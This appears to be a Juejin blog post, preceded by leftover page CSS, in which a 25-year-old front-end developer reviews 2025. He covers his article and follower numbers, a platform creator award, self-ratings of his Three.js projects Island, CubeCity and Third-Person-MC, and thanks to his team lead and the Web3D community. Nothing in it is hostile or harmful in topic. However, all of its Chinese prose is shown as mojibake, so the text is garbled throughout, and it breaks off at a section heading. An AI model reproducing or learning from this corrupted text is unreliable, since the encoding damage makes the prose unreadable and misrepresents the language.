h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2025 å¹´ç»ˆæ€»ç»“ï¼š25 å²ï¼Œä»â€œæ··åƒç­‰æ­»â€åˆ°åˆ«äººçœ¼ä¸­çš„â€œæŠ€æœ¯ä¸“å®¶â€</h2>
<p>ä¸¤å¹´å‰çš„æ˜¥èŠ‚å‡æœŸï¼ŒæŸå¤©ã€‚åœ¨ä¸€æ‰€é¢ç§¯ä¸å¤§ã€ç´§é‚»å›½é“çš„å»‰ç§Ÿæˆ¿é‡Œï¼Œä½ç€ä¸‰ä¸ªäººã€‚</p>
<p>é‚£æ—¶çš„æˆ‘ï¼Œè¿˜æ˜¯ä¸ªå‡­è¿æ°”æ··è¿›å¤§å…¬å¸ã€å¤©å¤©å†™ CRUD æ··åƒç­‰æ­»çš„å‰ç«¯â€œå°å¡æ‹‰ç±³â€ã€‚è¶ç€æ˜¥èŠ‚å‡æœŸï¼Œæˆ‘æˆ´ç€è€³æœºï¼Œæ²‰æµ¸åœ¨æ¸¸æˆä¸–ç•Œé‡Œã€‚çªç„¶ï¼Œå®¢å…ä¼ æ¥ä¸€å£°é—·å“ã€‚</p>
<p>æˆ‘ç–‘æƒ‘åœ°æ‘˜ä¸‹è€³æœºï¼šâ€œä»€ä¹ˆå£°éŸ³ï¼Ÿâ€</p>
<p>å›å¤´æœ›å»ï¼Œæˆ‘çœ‹åˆ°å¥¶å¥¶ä»°é¢èººåœ¨æ²™å‘ä¸Šâ€”â€”å¥¹æ™•å€’äº†ã€‚</p>
<p>é‚£æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è§åˆ°æˆ‘æœ€äº²çˆ±çš„äº²äººï¼ˆæˆ‘æ˜¯å•äº²+ç•™å®ˆå„¿ç«¥ï¼‰ç—…å€’åœ¨é¢å‰ã€‚æ…Œä¹±ä¸­ï¼Œæˆ‘ç»™åœ¨å¤–æ‰“ç‰Œçš„çˆ¶äº²æ‹¨å»äº†ç”µè¯ã€‚æœ€å<strong>æ‰€å¹¸</strong>å¹¶æ— å¤§ç¢ï¼Œä½†åœ¨é‚£ä¸€åˆ»ï¼Œæˆ‘çŸ¥é“ï¼š<strong>æˆ‘ä¸èƒ½å†è¿™æ ·æ··ä¸‹å»äº†ï¼Œæˆ‘éœ€è¦åŠªåŠ›ã€‚</strong></p>
<p>ä¸¤å¹´åçš„ä»Šå¤©ï¼Œå†å›å¤´çœ‹ï¼š</p>
<ul>
<li>æˆ‘æˆä¸ºäº†å›¢é˜Ÿä¸­ä¸å¯æˆ–ç¼ºçš„æŠ€æœ¯æ ¸å¿ƒ</li>
<li>æˆ‘æˆä¸ºäº†ç¨€åœŸæ˜é‡‘ 2025 å¹´åº¦ä¼˜ç§€åˆ›ä½œè€…</li>
<li>æˆ‘å¼€æºçš„é¡¹ç›®ç´¯è®¡è·å¾— 1K+ GitHub Star</li>
<li>æˆ‘å¼€å§‹é¢‘ç¹å‡ºç°åœ¨ Three.js å®˜æ–¹æ¨ç‰¹çš„è½¬å‘åˆ—è¡¨ä¸­</li>
<li>ä¹Ÿç¬¬ä¸€æ¬¡ï¼Œè¢«åˆ«äººç§°ä¸ºã€ŒæŠ€æœ¯ä¸“å®¶ã€</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a0410fe20874471b90aca12aafb89bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=FRTWNwlLxUe9Fph9IEB%2BTo%2FU2sI%3D" alt="111.gif" loading="lazy"/></p>
<h3 data-id="heading-1">å‰è¨€ï¼šå‰ç«¯ç‰ˆâ€œè§ç‚â€ï¼Ÿä¸ï¼Œæ˜¯é¸½å­ç‹</h3>
<p>æˆ‘æ— æ„æƒ³å»å°†è¿‡å»ä¸¤å¹´åˆ°åº•æ˜¯å¦‚ä½•åº¦è¿‡çš„å†™æˆæ–‡ç« ï¼ŒæŠŠè¿™ç¯‡å¹´ç»ˆæ€»ç»“å†™æˆâ€œå‰ç«¯ç‰ˆè§ç‚â€çš„<strong>è‡ªä¼ </strong>ã€‚è€å®è¯´æˆ‘ä¹Ÿæƒ³ä¸èµ·æ¥æ˜¯æ€ä¹ˆè¿‡çš„ã€‚ä¸Šé¢é‚£æ®µæ²‰é‡çš„å¼€åœºç™½ï¼Œå°±å½“æ˜¯æˆ‘ä¸ºè‡ªå·±å°å°çš„éª„å‚²ä¸€ä¸‹å§ã€‚</p>
<p>å¥½äº†ï¼STOPï¼æ²‰é‡çš„è¯é¢˜åˆ°æ­¤ä¸ºæ­¢ã€‚è®©æˆ‘ä»¬ä¸€èµ·æ¥çœ‹çœ‹ï¼Œ<strong>â€œé¸½å­ç‹â€è€ä½•</strong>ä»Šå¹´åˆ°åº•å¹²äº†äº›ä»€ä¹ˆäº‹å§ï¼</p>
<h3 data-id="heading-2">1.æ‰€åœ¨ä¹‹å¹³å°ï¼šæ•°æ®ä¸æ„Ÿè°¢</h3>
<p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹ä»Šå¹´åœ¨å¹³å°ä¸Šçš„å…·ä½“â€œæˆ˜ç»©â€ã€‚ä»Šå¹´ä¸€å…±å†™äº†å¤šå°‘ç¯‡æ–‡ç« å‘¢ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3deeb7f549ea4af388c6fb93fd50e3bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=JocLRT6%2Bn83Ut43G7bFA2G%2Fk8gg%3D" alt="æ›´æ–°é¢‘ç‡.png" loading="lazy"/></p>
<p><strong>å“‡ï¼å±…ç„¶æœ‰è¶³è¶³ 9 ç¯‡ä¹‹å¤šï¼</strong> è¿™ä¸ªæ•°é‡çœŸæ˜¯é—»è€…ä¼¤å¿ƒã€å¬è€…è½æ³ªï¼Œè¿è¥çœ‹äº†æƒ³æ‰“äººï¼ˆå³è¾¹ç‹å°¼å…‹çœŸçš„æ˜¯è¿è¥å‚¬æ›´æˆ‘æ—¶çš„è¡¨æƒ… be like...ï¼‰ã€‚ä¸è¿‡å¥½åœ¨æ•°æ®è¿˜ç®—è¿‡å¾—å»ï¼Œæ”¶è·äº† <strong>1217 åç²‰ä¸</strong>ã€‚çœŸçš„ç‰¹åˆ«ç‰¹åˆ«æ„Ÿè°¢ä½ ä»¬ï¼ä¸å¤šè¯´äº†ï¼Œå°±æˆ‘è¿™â€œéšç¼˜æ›´æ–°â€çš„é¢‘ç‡è¿˜èƒ½æœ‰ç²‰ä¸ï¼ŒçœŸçš„å¾—ç»™â€œ<strong>ä¹‰çˆ¶ä»¬</strong>â€ç£•ä¸€ä¸ªã€‚</p>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94deb121ec444c4786e7733bf287cfc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=JVIDmwZS1VdnaIB7Ezx29v24P50%3D" alt="æ„Ÿè°¢ ç»™ä½ ç£•å¤´ GIF åŠ¨å›¾_çˆ±ç»™ç½‘_aigei_com.gif" loading="lazy"/></p>
<p>åœ¨æ­¤æœŸé—´ï¼Œæˆ‘ä¹Ÿæ”¶è·äº†éå¸¸ä¸é”™çš„æµé‡ï¼Œæ„Ÿè°¢å„å¤§ç½‘å‹ã€ç¾¤å‹å’Œå¹³å°è¿è¥è€å¸ˆçš„å¤§åŠ›æ‰¶æŒã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/29e2ba78ccfa4b4f954138ef459e80d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=UJx8Yf1kJQURcs%2FG0x3VmNfqto4%3D" alt="222.png" loading="lazy"/></p>
<p>æœ€ç»ˆï¼Œæˆ‘è·å¾—äº† <strong>ã€Œç¨€åœŸæ˜é‡‘ 2025 å¹´åº¦ä¼˜ç§€åˆ›ä½œè€…ã€</strong> çš„è£èª‰ã€‚å½“æ—¶è¿è¥è€å¸ˆé€šçŸ¥æˆ‘çš„æ—¶å€™ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37608b2cccc4463492a7bc425c43bdc8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=vTX9B%2B0TSukM53%2F9dtHsY39Oyd8%3D" alt="11111111111111111.png" loading="lazy"/></p>
<blockquote>
<p><strong>æ³°è£¤è¾£ï¼å…„å¼Ÿä»¬ä¹Ÿæ˜¯å¥½èµ·æ¥äº†ï¼</strong></p>
</blockquote>
<p>è¯´çœŸçš„ï¼Œèƒ½æ‹¿è¿™ä¸ªå¥–å®Œå®Œå…¨å…¨å½’åŠŸäºä¸‡èƒ½çš„ç¾¤å‹ä»¬å’Œè¿è¥è€å¸ˆæ»¡æ»¡çš„ Pushï¼Œæ˜¯ä½ ä»¬çš„ç›‘ç£è®©æˆ‘å¾—ä»¥å°†å†™æ–‡ç« çš„ä¹ æƒ¯ï¼ˆå‹‰å¼ºï¼‰åšæŒä¸‹å»ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19ed1e4e912c49ee91e47c7caa3b037b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=V2xXV3irFR8rnbmeWzlKjt3Egcs%3D" alt="å¾®ä¿¡åœ–ç‰‡_20260108111207_10_110.jpg" loading="lazy"/></p>
<h3 data-id="heading-3">2.æ‰€åšä¹‹é¡¹ç›®ï¼šä»â€œå¤¯â€åˆ°â€œæ‹‰â€çš„é”è¯„</h3>
<p>æ¥åˆ°é¡¹ç›®ç¯èŠ‚ï¼Œè®©æˆ‘ä»¥æå…¶å®¢è§‚ï¼ˆè‡ªæˆ‘æ£€è®¨ï¼‰çš„è§†è§’ï¼Œé”è¯„ä¸€ä¸‹ä»Šå¹´å¼€æºçš„é¡¹ç›®å§ï¼</p>
<h4 data-id="heading-4">ğŸï¸ Island â€”â€” 2.5D å¡é€šé£ä¸ªäººç®€å†\</h4>
<blockquote>
<p><strong>è‡ªæˆ‘è¯„ä»·ï¼šäººä¸Šäºº</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8911dac514c4474a9234451df7d34a07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=m9X7ieqZkWLaeCqnBCmj2roQ1MA%3D" alt="island.gif" loading="lazy"/></p>
<p><a href="https://juejin.cn/post/7498914140166799397" target="_blank" title="https://juejin.cn/post/7498914140166799397"><code>island</code></a> å¯¹ç°åœ¨çš„æˆ‘æ¥è¯´ï¼Œç¡®å®å­˜åœ¨ä¸å°‘é—®é¢˜ï¼š</p>
<ul>
<li><strong>ç”»é¢é£æ ¼</strong>ï¼šä¸‰æ¸²äºŒçš„æ•ˆæœè¿˜éœ€ä¼˜åŒ–ï¼Œä»”ç»†çœ‹è·ç¦»å°æ—¶å€™åœ¨ PSP ä¸Šç©çš„æ¸¸æˆé£æ ¼è¿˜æœ‰å·®è·ï¼Œåç»­è®¡åˆ’åŠ å…¥è‡ªå®šä¹‰åå¤„ç†é€šé“æ¥è°ƒèŠ‚ã€‚</li>
<li><strong>UI è®¾è®¡</strong>ï¼šå½“æ—¶ç”¨ DALLÂ·E 3 ç”Ÿæˆçš„ UI æ¯”è¾ƒç®€é™‹ï¼Œåç»­ä¼šç”¨ <strong>Nano-banana-pro</strong> å…¨é¢æ”¹è¿› UI é£æ ¼ã€‚</li>
<li><strong>å…¼å®¹æ€§</strong>ï¼šç§»åŠ¨ç«¯é€‚é…ï¼Ÿä¸å­˜åœ¨çš„ï¼Œæ‰‹æœºå’Œå¹³æ¿ç”¨æˆ·åªèƒ½å¹²çªçœ¼ = =ã€‚</li>
<li><strong>äº¤äº’æ€§</strong>ï¼šå¯äº’åŠ¨å†…å®¹å•è°ƒï¼Œé è¿‘ç‰©ä½“æ²¡æœ‰è§†è§‰åé¦ˆã€‚</li>
<li><strong>å±•ç¤ºæ–¹å¼</strong>ï¼šç©å®¶éœ€è¦åˆ°åœºæ™¯ä¸Šæ–¹ç‚¹å‡»å‘Šç¤ºç‰Œå±•ç¤ºæ–°é¡¹ç›®ï¼Œæ–¹å¼å¤ªå•ä¸€ï¼Œå’Œç½‘é¡µæ²¡å•¥åŒºåˆ«ï¼</li>
</ul>
<p>ä½†è¯åˆè¯´å›æ¥ï¼Œè¿™ç¡®å®æ˜¯æˆ‘ç¬¬ä¸€ä¸ªæœ‰ç‚¹â€œå‡ºåœˆâ€çš„é¡¹ç›®ã€‚ä¹Ÿè®¸æ¯ä¸ªäººå›çœ‹ä»¥å‰çš„ä»£ç éƒ½ä¼šè§‰å¾—ç¨šå«©ï¼Œå·¦çœ‹å³çœ‹èƒ½æŒ‘å‡ºä¸€å †æ¯›ç—…ï¼Œä½†ä¸å¯å¦è®¤å®ƒåœ¨æˆ‘å¿ƒä¸­çš„åœ°ä½ã€‚ç»¼åˆä¸‹æ¥ï¼Œç»™ä¸ª**â€œäººä¸Šäººâ€**çš„è¯„ä»·ï¼åé¢çš„æ”¹åŠ¨è¿˜èƒ½åœ¨æ˜é‡‘å¤šæ°´ä¸¤ç¯‡æ–‡ç« ï¼Œç¾æ»‹æ»‹ã€‚</p>
<h4 data-id="heading-5">ğŸ™ï¸ CubeCity â€”â€” å¡é€šåŸå¸‚æ”¾ç½®ç³»ç»Ÿ</h4>
<blockquote>
<p><strong>è‡ªæˆ‘è¯„ä»·ï¼šé¡¹ç›®é¡¶å°–ï¼Œä½œè€…â€œæ‹‰å®Œäº†â€</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4788327e533841ff9f95e71ea05b4bb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=B0tL3n6mY9cuOuidKRnqgdAbbf0%3D" alt="æ¸¸ç©æ—¶åŠ¨å›¾.gif" loading="lazy"/></p>
<p><a href="https://juejin.cn/post/7538715423534399534" target="_blank" title="https://juejin.cn/post/7538715423534399534"><code>CubeCity</code></a> æ˜¯æˆ‘ GitHub ä¸Š Star æœ€å¤šçš„é¡¹ç›®ï¼Œå•ä¸ªé¡¹ç›®è´¡çŒ®äº† <strong>877 Star</strong>ã€‚ç©æ³•å‚è€ƒäº†ã€Šå¡ç‰ŒåŸé•‡ã€‹ï¼Œæ”¯æŒéšæ„å»ºé€ ã€æ‹†é™¤ã€å‡çº§ã€æ¬è¿å»ºç­‘ã€‚UI è´´åˆ Low Poly é£æ ¼ï¼Œåœ¨å›½å¤–ç¤¾åŒºä¹Ÿå¾ˆè®¨å–œã€‚</p>
<p>ä½† Star å¤šä¸ä»£è¡¨æ²¡é—®é¢˜ï¼š</p>
<ul>
<li><strong>æ€§èƒ½</strong>ï¼šæ¸²æŸ“å¸§ç‡å ªå¿§ï¼Œæ¯”å¦‚ GTX 1660 Ti è¿™ç§æ˜¾å¡éƒ½è·‘ä¸æ»¡ 60 FPSã€‚</li>
<li><strong>ç”Ÿæ°”</strong>ï¼šé“è·¯ä¸Šæ²¡æœ‰æ±½è½¦å’Œå°äººè·‘åŠ¨ï¼ŒåŸå¸‚æ˜¾å¾—ç©ºè¡è¡ã€‚</li>
<li><strong>å…¼å®¹æ€§</strong>ï¼šç§»åŠ¨è®¾å¤‡åˆåŒå’æ²¡åšå…¼å®¹ï¼Ÿï¼GitHub ä¸Šæçš„ Issue ä¹Ÿä¸å›ï¼Ÿå¯æ¶çš„é¸½å­ç‹ï¼</li>
<li><strong>åŠŸèƒ½ç¼ºå¤±</strong>ï¼šè¯´å¥½çš„æˆå°±ç³»ç»Ÿå‘¢ï¼Ÿç»æµç³»ç»Ÿå‘¢ï¼Ÿç¤¾äº¤æ’è¡Œæ¦œå‘¢ï¼Ÿ</li>
</ul>
<p>ä½•è´¤ä½ åœ¨å¹²å˜›ï¼Ÿæ€»è€Œè¨€ä¹‹ï¼Œè¿™ä¸ªé¡¹ç›®ç®€ç›´æ˜¯<strong>é¸½åˆ°æ²¡æœ‹å‹ï¼Œæœ€é¸½çš„ä¸€é›†</strong>ï¼X ä¸Šè¯„è®ºä¸å›ï¼ŒGitHub ä¸Š Issue è£…æ­»ã€‚è¦ä¸æ˜¯é¡¹ç›®åº•å­è¿˜è¡Œï¼Œæˆ‘çœŸçš„è¦éª‚äººäº†ï¼</p>
<p>ç»¼åˆä¸‹æ¥é¡¹ç›®ç»™åˆ°<strong>é¡¶å°–</strong>ï¼Œä½†æ˜¯å¼€å‘è€…ç»™åˆ° <strong>æ‹‰å®Œäº†</strong> å•Šï¼</p>
<h4 data-id="heading-6">Third-Person-MCâ€”â€”ç¬¬ä¸‰äººç§°æˆ‘çš„ä¸–ç•Œ</h4>
<blockquote>
<p><strong>è‡ªæˆ‘è¯„ä»·ï¼šå¤¯</strong></p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/13b59621537949ed8c9474085286dac1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=3hNFDawVjAYajgn9S27GIsCgKc8%3D" alt="03.gif" loading="lazy"/></p>
<p>è¿™ä¸ªé¡¹ç›®æ˜å‹ä»¬å¯èƒ½æ²¡æ€ä¹ˆå¬è¿‡ï¼Œä½†åœ¨ç¾¤é‡Œåº”è¯¥å¤šå¤šå°‘å°‘è§è¯†è¿‡ã€‚è¿™æ˜¯ç›®å‰å¯¹æˆ‘æ¥è¯´æœ€å¤æ‚çš„ä¸€ä¸ªé¡¹ç›®ï¼</p>
<p>è¯¥é¡¹ç›®å…·å¤‡å¤šç§ç”Ÿæ€åœ°è²Œã€æ— é™åœ°å½¢ç”Ÿæˆä¸è‡ªé€‚åº”ç›¸æœºç­‰æ ¸å¿ƒç‰¹æ€§ï¼Œ<strong>ä¸ä¹…çš„å°†æ¥</strong>ï¼Œå³å°†æ­£å¼ç™»é™†æ˜é‡‘å¹³å°ä¸å¤§å®¶è§é¢ã€‚è‡³äºæ˜¯å¦ä¼šè¿›ä¸€æ­¥æ‰©å±•è”æœºç³»ç»Ÿï¼Œç›®å‰å°šæ— å®šè®ºã€‚ç›¸å…³å†…å®¹ï¼Œæˆ‘ä¼šåœ¨åç»­å‘å¸ƒçš„ä¸“é¢˜æ–‡ç« ä¸­ä¸ºå¤§å®¶è¯¦ç»†è§£è¯»ã€‚</p>
<p>æ€»ä½“æ¥è¯´è¿˜ä¸é”™ï¼å®æœºæµ‹è¯•åœ¨ GTX 1660 Ti çš„ç¬”è®°æœ¬ä¸Šä¹Ÿèƒ½ç¨³å®š 30 å¸§ï¼ç®—æ˜¯ä¸€ä¸ªéå¸¸æœ‰æ„æ€çš„æ¢ç´¢ã€‚ç»¼åˆè¯„ä»·ï¼š<strong>å¤¯</strong>ã€‚</p>
<hr/>
<p>å¥½äº†å¥½äº†æ‰“ä½ï¼ä»Šå¹´è¯´å®è¯è¿˜æ˜¯å¼€æºäº†ä¸å°‘é¡¹ç›®ï¼ä½†æ˜¯ä¸èƒ½åœ¨è¿™å ç”¨ç¯‡å¹…ï¼åœ¨æ­¤æˆ‘ç›´æ¥å°±æ˜¯ä¸€ä¸ªé¡¹ç›®å¤§åˆå½±</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b540ba7f3024f33a8b3d31035dfd988~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=hQKO%2BpWvXgYlAqEx%2BExn0jdvVVw%3D" alt="Snipaste_2026-01-08_14-36-36.png" loading="lazy"/></p>
<p>ä»¥åŠå¯¹äºæˆ‘æ¥è¯´æ‰€æœ‰é¡¹ç›®<strong>ä»å¤¯åˆ°æ‹‰</strong>çš„æ’åå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/781a3e51f71f4bd1bb7752dbd8eac5ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L2V6LSk:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768469632&amp;x-signature=dfYHqt%2F2JERJjxDRl8vJ4CEsqDY%3D" alt="æˆ‘çš„ä»å¤¯åˆ°æ‹‰.png" loading="lazy"/></p>
<h3 data-id="heading-7">3.æ‰€é‡ä¹‹å¥½å‹ï¼šè‰¯å¸ˆç›Šå‹</h3>
<p>è¿‘å¹´æœ€å¹¸è¿çš„äº‹ï¼Œå°±æ˜¯é‡åˆ°äº†ä¸€ä¸ªå¾ˆå¥½çš„é¢†å¯¼ï¼Œä»¥åŠä¸€ç¾¤å¿—åŒé“åˆã€ç›¸äº’å‹‰åŠ±çš„æœ‹å‹ã€‚</p>
<h4 data-id="heading-8">å…³äºâ€œå†·çˆ·â€</h4>
<p>åœ¨å·¥ä½œä¸Šï¼Œæˆ‘é‡åˆ°äº†ä¸€ä½å¥½é¢†å¯¼ï¼Œä½†æˆ‘æ›´æ„¿ç§°ä»–ä¸ºå¥½æœ‹å‹â€”â€”<strong>å†·çˆ·</strong>ã€‚ å¹³æ—¶ç¾¤å‹æˆ–åˆä½œä¼™ä¼´å¯èƒ½è§‰å¾—æˆ‘æ˜¯ä¸ªæ¸©å’Œçš„äººï¼Œå¯ä¸€æ—¦åˆ‡å…¥å·¥ä½œæ¨¡å¼ï¼Œæˆ‘å°±ä¼šå˜æˆå¤§å®¶å£ä¸­çš„â€œå‹åŠ›æ€ªâ€ã€‚å› æ­¤æ›¾æœ‰ä¸€æ®µæ—¶é—´ï¼Œæˆ‘å’ŒåŠå…¬ç¯å¢ƒæœ‰äº›æ ¼æ ¼ä¸å…¥ã€‚å†·çˆ·ä½œä¸º Leaderï¼ŒçœŸçš„èµ·åˆ°äº†è‡³å…³é‡è¦çš„æ¶¦æ»‘ä½œç”¨ã€‚ ç”Ÿæ´»ä¸­ï¼Œå†·çˆ·ä¹Ÿç»å¸¸å¸¦æˆ‘å‡ºå»ç©ã€‚é‚£æ®µæ—¶é—´æˆ‘çœŸæ˜¯â€œä¸¤è€³ä¸é—»çª—å¤–äº‹ï¼Œä¸€å¿ƒåªæƒ³å­¦æŠ€æœ¯â€ï¼Œå½»å½»åº•åº•çš„å®…ç”·ä¸€æšã€‚è¦ä¸æ˜¯å†·çˆ·æ‹‰ç€æˆ‘æ¸¸å±±ç©æ°´ï¼Œæˆ‘å¯èƒ½çœŸå°±æˆäº†é‚£ç§â€œä»£ç æ•²å¾—é£èµ·ã€è¯å´è¯´ä¸æ¸…æ¥šâ€çš„åˆ»æ¿æå®¢ã€‚ ä»–æ˜¯ä¸€ä¸ªå¥½é¢†å¯¼ï¼Œæ›´æ˜¯ä¸€ä¸ªå¥½æœ‹å‹ã€‚<strong>åœ¨è¿™é‡Œæƒ³å¯¹å†·çˆ·è¯´ä¸€å£°ï¼šè°¢è°¢ï¼</strong></p>
<h4 data-id="heading-9">å…³äº Web3D åœˆå­</h4>
<p>éšç€æ·±å…¥å­¦ä¹  Web3Dï¼Œæˆ‘å¾®ä¿¡é‡Œå¤šäº†å¾ˆå¤šè€•è€˜äºæ­¤çš„æœ‹å‹ã€‚è™½ç„¶å¤§å®¶ç»†åˆ†é¢†åŸŸä¸åŒâ€”â€”æœ‰åšå¯è§†åŒ–å¤§å±çš„ï¼Œæœ‰åš 3D çœ‹è½¦/çœ‹æˆ¿çš„ï¼Œæœ‰ç ”ç©¶ NVIDIA Isaac Sim çš„ï¼Œä¹Ÿæœ‰åšæ•°å­—å·¥å‚/æœºæ¢°è‡‚çš„ã€‚ç”šè‡³æœ‰äº›æ›¾æ˜¯æˆ‘åœ¨è§†é¢‘ç½‘ç«™ä¸Šä»°æœ›çš„å¶åƒï¼Œç°åœ¨ä¹Ÿæˆäº†åˆ—è¡¨å¥½å‹ã€‚</p>
<p>å¤§å®¶èšåœ¨ä¸€èµ·åˆ†äº«æŠ€æœ¯ï¼Œæ‰¯çš®æ‰“è¶£ï¼Œå¤§ä½¬ä»¬æ—¶ä¸æ—¶å†’æ³¡ç­”ç–‘ã€‚è¿™ä¸ªåœˆå­å¾ˆå°ï¼ŒæŠ¬å¤´ä¸è§ä½å¤´è§ï¼Œä½†çœŸçš„å¾ˆå°‘å‡ºç°æ‹‰è¸©æˆ–è¯‹æ¯ã€‚<strong>æˆ‘æ˜¯åœ¨ç¾¤å‹ä»¬çš„â€œå¤¸å¤¸â€ä¸­ä¸€æ­¥æ­¥èµ°åˆ°è¿™é‡Œçš„ã€‚</strong> è¿™ç§æ­£åé¦ˆéå¸¸å¥‡å¦™ï¼šåŠ¨åŠ›æ¥è‡ªç¾¤å‹çš„é¼“åŠ±å’Œå¤§ä½¬çš„è®¤å¯ï¼Œè€Œè¿™äº›åˆä¿ƒä½¿æˆ‘åˆ›é€ å‡ºæ›´å¥½çš„é¡¹ç›®ï¼</p>
<h3 data-id="heading-10">4. æ‰€æƒ³ï¼šè¿æ°”è¡¨é¢ç§¯</h3>
